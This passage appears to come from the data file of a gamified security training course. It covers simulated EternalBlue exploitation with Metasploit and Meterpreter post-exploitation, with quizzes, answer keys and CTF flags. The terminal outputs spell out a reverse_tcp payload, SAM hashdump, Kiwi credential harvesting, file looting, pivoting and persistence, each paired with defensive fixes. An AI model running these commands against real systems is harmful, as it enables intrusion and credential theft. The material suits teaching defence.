        { id: "range-msf-03-q6", type: "Session", challenge: "Confirm control.", text: "After the session opens, which Meterpreter command confirms you are SYSTEM?", options: ["getuid", "ls", "ping", "exit"], correctIndex: 0, explanation: "`getuid` prints the current user — here NT AUTHORITY\\SYSTEM." },
        { id: "range-msf-03-q7", type: "Real World", challenge: "Worm.", text: "Which 2017 worm weaponized EternalBlue to infect 200,000+ machines?", options: ["WannaCry", "ILOVEYOU", "Mirai", "Conficker"], correctIndex: 0, explanation: "WannaCry chained EternalBlue (spread) with ransomware (extortion) in May 2017." },
        { id: "range-msf-03-q8", type: "Defense", challenge: "The fix that existed.", text: "What would have prevented the WannaCry catastrophe?", options: ["Applying the MS17-010 patch (released a month earlier) and disabling SMBv1", "Stronger passwords", "A new antivirus signature only", "Renaming the SMB share"], correctIndex: 0, explanation: "The patch predated the leak by a month; patching + killing SMBv1 + segmentation stops it." },
      ],
    },
    ctf: {
      attackerMachine: { ip: "10.10.14.5", hostname: "kali", os: "Kali Linux 2024.1" },
      targetMachine: { ip: "10.10.10.40", hostname: "win7-target", os: "Windows 7 SP1 (x64)", openPorts: "445 (SMBv1)", vulnerability: "MS17-010 / EternalBlue — CVE-2017-0144, CVSS 8.1" },
      pivotTrigger: "exploit",
      scenario: "Recon confirmed 10.10.10.40 is vulnerable to MS17-010. Load EternalBlue in Metasploit, configure your listener and a Meterpreter payload, and pop the box. On success your terminal pivots into the target as SYSTEM.",
      hint: "Load the eternalblue module, set the target and your listener, then fire. After the session opens you're inside the box — confirm with getuid.",
      hints: [
        "Read the briefing. Run: cat briefing.txt",
        "Load and configure the EternalBlue module. Run: msf-use",
        "Fire the exploit (opens a Meterpreter session + pivots you in). Run: exploit",
        "Inside the box, confirm your privilege. Run: getuid   — then run 'assemble'",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{3T3RNALBLU3_", label: "EternalBlue Briefing" },
        { trigger: "msf-use", value: "M3T3RPR3T3R_", label: "Module Loaded + Payload Set" },
        { trigger: "exploit", value: "SYST3M}", label: "Box Popped — Meterpreter as SYSTEM" },
      ],
      files: {
        "/briefing.txt": [
          "RANGE LAB 3 — ETERNALBLUE",
          "Target: 10.10.10.40  (MS17-010 confirmed vulnerable)",
          "Listener (you): 10.10.14.5",
          "",
          "Sequence: msf-use -> exploit -> getuid -> assemble",
          "Goal: a Meterpreter session running as NT AUTHORITY\\SYSTEM.",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "msf-use": (_args: string[]) => ({
          lines: [
            "msf6 > use exploit/windows/smb/ms17_010_eternalblue",
            "msf6 exploit(ms17_010_eternalblue) > set RHOSTS 10.10.10.40",
            "msf6 exploit(ms17_010_eternalblue) > set LHOST 10.10.14.5",
            "msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp",
            "msf6 exploit(ms17_010_eternalblue) > check",
            "[+] 10.10.10.40:445 - The target is vulnerable.",
            "",
            ">> LEARN: RHOSTS = target, LHOST = your listener, PAYLOAD = what lands",
            "   The reverse_tcp Meterpreter payload will call back to LHOST:4444.",
            "   'check' confirmed it without firing. Now run: exploit",
          ],
        }),
        "exploit": (_args: string[]) => ({
          lines: [
            "msf6 exploit(ms17_010_eternalblue) > exploit",
            "[*] Started reverse TCP handler on 10.10.14.5:4444",
            "[*] 10.10.10.40:445 - Connecting to target for exploitation.",
            "[+] 10.10.10.40:445 - Grooming the kernel non-paged pool...",
            "[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=",
            "[*] Sending stage (200774 bytes) to 10.10.10.40",
            "[*] Meterpreter session 1 opened (10.10.14.5:4444 -> 10.10.10.40:49158)",
            "",
            "meterpreter >    (you are now INSIDE the target)",
            "",
            ">> LEARN: pre-auth kernel RCE → SYSTEM, no privesc needed",
            "   Confirm with getuid, then run 'assemble' for the flag.",
          ],
        }),
        "getuid": (_args: string[]) => ({
          lines: [
            "meterpreter > getuid",
            "Server username: NT AUTHORITY\\SYSTEM",
            "",
            ">> LEARN: SYSTEM is the highest privilege on Windows — total control.",
            "   You skipped privilege escalation entirely; the kernel exploit gave it free.",
          ],
        }),
        "sysinfo": (_args: string[]) => ({
          lines: [
            "meterpreter > sysinfo",
            "Computer        : WIN7-TARGET",
            "OS              : Windows 7 (6.1 Build 7601, Service Pack 1).",
            "Architecture    : x64",
            "Meterpreter     : x64/windows",
          ],
        }),
      },
    },
  },

  // ─── Lab 4: post-exploitation + the blue-team bill ──────────────────────────
  {
    epochId: "range-metasploit",
    wonder: { name: "The Loot Vault", location: "Offensive Security Lab", era: "Present Day", emoji: "💰" },
    id: "range-msf-04",
    order: 4,
    title: "Meterpreter: Loot & the Blue-Team Bill",
    subtitle: "Post-exploitation — hashdump, loot, pivot, and the fix",
    category: "cybersecurity",
    xp: 200,
    badge: { id: "badge-range-msf-loot", name: "Post-Exploitation", emoji: "💰" },
    challengeType: "ctf",
    info: {
      tagline: "A shell is the beginning, not the end — dump credentials, loot the box, understand pivoting, then pay the blue-team bill that stops it all.",
      year: 2017,
      overview: [
        "Owning a single box is the start of an engagement, not the finish. Post-exploitation is where a foothold becomes impact: you harvest credentials to move laterally, collect the evidence (and flags) that prove access, establish persistence so you survive a reboot, and pivot — routing your traffic through the compromised host to reach networks you couldn't touch from outside. Meterpreter exists to make all of this fast and quiet, running in memory with a command set built for exactly these tasks.",
        "Credential theft is the highest-value move. From a SYSTEM session, hashdump reads the local SAM database and prints every user's NTLM password hash; tools like Kiwi (Mimikatz built into Meterpreter) can pull plaintext passwords and Kerberos tickets straight from memory. Those hashes feed pass-the-hash attacks and offline cracking, and on a real network that's how one popped workstation becomes domain-wide compromise. Looting — searching the filesystem for sensitive files and downloading them — is the other half: search -f *.txt, then download.",
        "Every offensive step here has a defensive mirror, and that's the point of the lab. The exact fix for this entire chain is unglamorous and decisive: apply MS17-010, disable SMBv1 entirely, segment the network so SMB can't traverse it freely, deploy EDR that flags pool grooming and credential dumping, and watch for the SMB and authentication patterns these tools generate. The attacker's playbook is the defender's detection checklist — learn one to build the other.",
      ],
      technical: {
        title: "Post-Exploitation + Detection",
        body: [
          "The post-exploitation moves you just enabled:\n- hashdump — dump local NTLM hashes from the SAM (post/windows/gather/hashdump).\n- load kiwi; creds_all — Mimikatz in memory: plaintext passwords, tickets, secrets.\n- search -f *.txt + download — find and exfiltrate sensitive files (looting).\n- run persistence / registry run-keys / scheduled tasks — survive reboots.\n- run autoroute -s 10.10.20.0/24 + a socks proxy — pivot deeper into segmented networks.",
          "Why a single foothold escalates to the whole network:\n- Dumped hashes enable pass-the-hash — authenticate as a user without cracking the password.\n- Reused local-admin passwords let one hash unlock many machines.\n- Pivoting routes attacker traffic through the victim, so internal-only hosts become reachable.\n- This is the lateral-movement engine behind real breaches — the foothold is just the door.",
          "The blue-team bill (the fix that stops all of the above):\n- Patch MS17-010 and DISABLE SMBv1 outright — it's legacy and should be gone.\n- Network segmentation — don't let SMB/445 traverse the environment freely.\n- EDR/AV — detect pool grooming, in-memory Meterpreter, and LSASS/SAM access (credential dumping).\n- Least privilege + LAPS — unique local-admin passwords kill pass-the-hash reuse.\n- Monitoring — alert on anomalous SMB, new services/run-keys, and mass authentication.",
        ],
        codeExample: {
          label: "Meterpreter post-exploitation",
          code: `meterpreter > hashdump
Administrator:500:aad3b...:31d6cfe0d16ae931b73c59d7e0c089c0:::
jsmith:1001:aad3b...:5835048ce94ad0564e29a924a03510ef:::

meterpreter > search -f *.txt
Path                                          Size
c:\\Users\\Administrator\\Desktop\\flag.txt    42

meterpreter > download c:\\Users\\Administrator\\Desktop\\flag.txt
[*] downloaded flag.txt

# ── BLUE TEAM: the fix ──────────────────────────────────────────
# 1) Patch MS17-010   2) Disable SMBv1 entirely
# 3) Segment so 445 can't traverse   4) EDR for credential dumping
# 5) LAPS so local-admin hashes aren't reusable`,
        },
      },
      incident: {
        title: "One Foothold to Domain Admin — the Pattern",
        when: "Every modern breach with lateral movement",
        where: "Enterprise Windows networks — from EternalBlue footholds to ransomware deployment",
        impact: "A single unpatched host repeatedly becomes full network compromise via credential reuse and pivoting",
        body: [
          "The reason post-exploitation matters more than the initial pop is empirical: real intrusions rarely stop at one machine. WannaCry and NotPetya used EternalBlue not just to get in but to spread, and human-operated ransomware crews follow the same script by hand — pop a box, dump credentials, pass-the-hash to the next, repeat until they reach a domain controller, then deploy. The initial foothold is cheap; the credential theft and pivoting are what turn it into a company-ending event.",
          "That is why defenders invest where they do: EDR tuned for credential dumping, network segmentation to break the pivot, LAPS to kill local-admin reuse, and aggressive removal of legacy protocols. Disabling SMBv1 and patching one bulletin would have neutered the most damaging malware of the decade. The offense you practiced in this lab is, read backwards, the exact prioritized checklist the blue team should run first.",
        ],
      },
      diagram: {
        nodes: [
          { label: "SYSTEM session", sub: "meterpreter", type: "attacker" },
          { label: "hashdump / kiwi", sub: "credentials from SAM/LSASS", type: "system" },
          { label: "pass-the-hash + pivot", sub: "lateral movement", type: "victim" },
          { label: "Domain compromise", sub: "→ blue-team fix breaks the chain", type: "result" },
        ],
      },
      timeline: [
        { year: 2007, event: "Mimikatz-style credential theft enters the mainstream toolset" },
        { year: 2017, event: "EternalBlue + credential theft drives WannaCry/NotPetya lateral spread", highlight: true },
        { year: 2020, event: "Human-operated ransomware standardizes pop → dump → pivot → deploy" },
      ],
      keyTakeaways: [
        "Post-exploitation (not the initial pop) turns a foothold into network-wide impact",
        "hashdump pulls NTLM hashes; Kiwi/Mimikatz pulls plaintext creds and tickets from memory",
        "Dumped hashes enable pass-the-hash; reused local-admin passwords let one hash unlock many hosts",
        "Pivoting (autoroute + proxy) routes attacker traffic through the victim into segmented networks",
        "The fix is decisive: patch MS17-010, disable SMBv1, segment, deploy EDR, and use LAPS",
      ],
      references: [
        { title: "Rapid7 — Meterpreter post modules", url: "https://docs.rapid7.com/metasploit/about-post-exploitation/" },
        { title: "Microsoft — Disable SMBv1", url: "https://learn.microsoft.com/en-us/windows-server/storage/file-server/troubleshoot/detect-enable-and-disable-smbv1-v2-v3" },
      ],
    },
    quiz: {
      questions: [
        { id: "range-msf-04-q1", type: "Post-Ex", challenge: "Why it matters.", text: "Why is post-exploitation more important than the initial exploit?", options: ["A single foothold becomes network-wide impact via credential theft and pivoting", "It isn't — the pop is the goal", "It only cleans up logs", "It re-runs the scan"], correctIndex: 0, explanation: "Lateral movement from credentials and pivoting is what turns one box into a breach." },
        { id: "range-msf-04-q2", type: "Credentials", challenge: "Dump hashes.", text: "What does Meterpreter's hashdump do?", options: ["Dumps local NTLM password hashes from the SAM database", "Encrypts the disk", "Resets all passwords", "Lists open ports"], correctIndex: 0, explanation: "hashdump reads the SAM and prints NTLM hashes for offline cracking / pass-the-hash." },
        { id: "range-msf-04-q3", type: "Lateral", challenge: "Use a hash.", text: "What is a pass-the-hash attack?", options: ["Authenticating as a user with their NTLM hash, without knowing the plaintext password", "Cracking SHA-256", "A phishing email", "A DoS attack"], correctIndex: 0, explanation: "NTLM lets you authenticate with the hash directly — no plaintext needed." },
        { id: "range-msf-04-q4", type: "Pivot", challenge: "Go deeper.", text: "What does pivoting (autoroute + a proxy) achieve?", options: ["Routes attacker traffic through the compromised host to reach otherwise-unreachable networks", "Speeds up the exploit", "Deletes the payload", "Patches the target"], correctIndex: 0, explanation: "Pivoting uses the victim as a relay into segmented internal networks." },
        { id: "range-msf-04-q5", type: "Tooling", challenge: "Plaintext creds.", text: "What does loading Kiwi (Mimikatz) in Meterpreter enable?", options: ["Pulling plaintext passwords, hashes, and Kerberos tickets from memory", "Scanning ports", "Sending email", "Defragging the disk"], correctIndex: 0, explanation: "Kiwi is Mimikatz in Meterpreter — it harvests secrets from LSASS memory." },
        { id: "range-msf-04-q6", type: "Defense", challenge: "Kill the protocol.", text: "What single hardening step most directly stops EternalBlue?", options: ["Disable SMBv1 and patch MS17-010", "Change the desktop wallpaper", "Use a longer username", "Enable Telnet"], correctIndex: 0, explanation: "SMBv1 is legacy; disabling it and patching MS17-010 removes the vulnerability entirely." },
        { id: "range-msf-04-q7", type: "Defense", challenge: "Break reuse.", text: "How does LAPS reduce lateral movement?", options: ["It sets unique, rotating local-admin passwords so one stolen hash can't unlock many hosts", "It encrypts email", "It blocks all ports", "It disables Meterpreter"], correctIndex: 0, explanation: "Unique per-host local-admin passwords defeat pass-the-hash reuse." },
        { id: "range-msf-04-q8", type: "Detection", challenge: "What to watch.", text: "Which detection most directly catches this post-exploitation?", options: ["EDR alerting on credential dumping (SAM/LSASS access) and anomalous SMB/authentication", "A spam filter", "A CAPTCHA", "A cookie banner"], correctIndex: 0, explanation: "Credential-dumping and lateral SMB/auth patterns are the high-signal detections here." },
      ],
    },
    ctf: {
      attackerMachine: { ip: "10.10.14.5", hostname: "kali", os: "Kali Linux 2024.1" },
      targetMachine: { ip: "10.10.10.40", hostname: "win7-target", os: "Windows 7 SP1 (x64)", openPorts: "445 (SMBv1)", vulnerability: "Compromised — Meterpreter session active (SYSTEM)" },
      scenario: "You hold a Meterpreter session as SYSTEM on 10.10.10.40. Now do what a real operator does next: dump credentials, loot the flag off the box — and read the blue-team bill that would have stopped this entire chain.",
      hint: "Read the loot note, dump the SAM hashes, then grab the flag file. Each step teaches a post-exploitation move and its defense.",
      hints: [
        "Read the loot note. Run: cat loot.txt",
        "Dump local credential hashes. Run: hashdump",
        "Find and grab the flag from the box. Run: loot-flag",
        "Run 'assemble' to view the assembled flag and the submit command",
      ],
      fragments: [
        { trigger: "/loot.txt", value: "FLAG{L00T_", label: "Loot Note — Post-Exploitation Begins" },
        { trigger: "hashdump", value: "H4SHDUMP_", label: "SAM Hashes Dumped" },
        { trigger: "loot-flag", value: "PATCH_SMBV1}", label: "Flag Looted — and the Fix Learned" },
      ],
      files: {
        "/loot.txt": [
          "RANGE LAB 4 — POST-EXPLOITATION (session: SYSTEM @ 10.10.10.40)",
          "A shell is the beginning. Now: dump creds, loot, understand pivoting.",
          "",
          "Sequence: hashdump -> loot-flag -> assemble",
          "Then read the >> BLUE TEAM notes — the fix is the real lesson.",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "loot.txt", isDir: false }] },
      extraCommands: {
        "hashdump": (_args: string[]) => ({
          lines: [
            "meterpreter > hashdump",
            "Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::",
            "jsmith:1001:aad3b435b51404ee:5835048ce94ad0564e29a924a03510ef:::",
            "",
            ">> LEARN: these NTLM hashes are immediately useful",
            "   pass-the-hash: authenticate as the user with the hash, no cracking.",
            "   Reused local-admin hashes unlock other machines → lateral movement.",
            ">> BLUE TEAM: EDR should alert on SAM/LSASS access; LAPS kills hash reuse.",
            "   Fragment collected.",
          ],
        }),
        "loot-flag": (_args: string[]) => ({
          lines: [
            "meterpreter > search -f flag.txt",
            "  c:\\Users\\Administrator\\Desktop\\flag.txt",
            "meterpreter > download c:\\Users\\Administrator\\Desktop\\flag.txt",
            "[*] downloaded flag.txt",
            "",
            ">> LEARN: looting = find + exfiltrate sensitive files (search -f, download)",
            ">> BLUE TEAM — the fix that stops this ENTIRE chain:",
            "   1) Patch MS17-010 + DISABLE SMBv1   2) Segment so 445 can't roam",
            "   3) EDR for credential dumping        4) LAPS for unique admin passwords",
            "   One patch + killing SMBv1 would have stopped WannaCry.",
            "   Run 'assemble' to view the flag and the submit command.",
          ],
        }),
        "kiwi": (_args: string[]) => ({
          lines: [
            "meterpreter > load kiwi",
            "meterpreter > creds_all",
            "  [plaintext + ticket harvest from LSASS memory]",
            ">> LEARN: Kiwi = Mimikatz in Meterpreter — plaintext creds, hashes, tickets.",
            ">> BLUE TEAM: Credential Guard + EDR detect LSASS access.",
          ],
        }),
      },
    },
  },
];
